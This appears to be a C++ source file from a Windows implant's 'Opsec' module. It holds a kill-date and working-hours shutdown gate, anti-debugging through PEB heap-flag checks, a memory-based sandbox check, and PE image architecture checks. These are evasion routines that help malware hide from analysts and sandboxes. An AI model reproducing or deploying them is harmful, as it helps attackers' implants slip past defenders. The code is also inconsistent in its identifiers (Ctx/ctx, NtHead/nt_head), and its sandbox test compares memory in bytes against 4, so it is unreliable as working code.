#include <core/include/opsec.hpp>

using namespace Packet;
using namespace Commands;
using namespace Utils::Time;

namespace Opsec {
    BOOL CheckTime() {
        if (Ctx->Config.Killdate != 0) {
            if (GetTimeNow() >= Ctx->Config.Killdate) {
                Shutdown(nullptr);
            }
        }
        if (Ctx->Config.WorkingHours) {
            if (!InWorkingHours()) {
                return false;
            }
        }
        return true;
    }

    BOOL CheckDebugger() {
		// https://anti-debug.checkpoint.com/techniques/debug-flags.html#manual-checks-heap-flags
        PPEB peb  = PEB_POINTER;
        BOOL x32  = FALSE;

        PVOID heapBase          = { };
        DWORD flagsOffs         = 0;
        DWORD forceFlagsOffs    = 0;
        BOOL vistaOrGreater     = Ctx->Session.Version >= WIN_VERSION_2008;

        Ctx->Win32.IsWow64Process(NtCurrentProcess(), &x32);

#ifndef _WIN64
        heapBase = !x32 
			? (LPVOID)(*(DWORD_PTR*)((PBYTE)peb + 0x18)) 
			: (LPVOID)(*(DWORD_PTR*)((PBYTE)peb + 0x1030));

        flagsOffs 		= vistaOrGreater ? 0x40 : 0x0C;
        forceFlagsOffs 	= vistaOrGreater ? 0x44 : 0x10;
#else
        heapBase     	= (LPVOID)(*(DWORD_PTR*)((PBYTE)peb + 0x30));
        flagsOffs       = vistaOrGreater ? 0x70 : 0x14;
        forceFlagsOffs  = vistaOrGreater ? 0x74 : 0x18;
#endif
        DWORD *heapFlags      = (DWORD*)((PBYTE)heapBase + flagsOffs);
        DWORD *heapForceFlags = (DWORD*)((PBYTE)heapBase + forceFlagsOffs);

        return (*heapFlags & ~HEAP_GROWABLE) || (*heapForceFlags != 0);
    }

    BOOL CheckSandbox() {
        // TODO: check ACPI tables for vm vendors instead of just checking memory
        MEMORYSTATUSEX stats = { };
        stats.dwLength = sizeof(stats);

        ctx->win32.GlobalMemoryStatusEx(&stats);
        return stats.ullAvailPhys > 4;
    }

    BOOL ImageCheckArch(const EXECUTABLE *const image) {
        if (image->NtHead->Signature != IMAGE_NT_SIGNATURE) {
            ntstatus = ERROR_INVALID_EXE_SIGNATURE;
            return false;
        }
        if (image->NtHead->FileHeader.Machine != MACHINE_ARCH) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return false;
        }

        return true;
    }

    BOOL ImageCheckCompat(const EXECUTABLE *const source, const EXECUTABLE *const target) {
        if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return false;
        }
        if (target->nt_head->OptionalHeader.Subsystem != source->nt_head->OptionalHeader.Subsystem) {
            ntstatus = ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT;
            return false;
        }

        return true;
    }
}
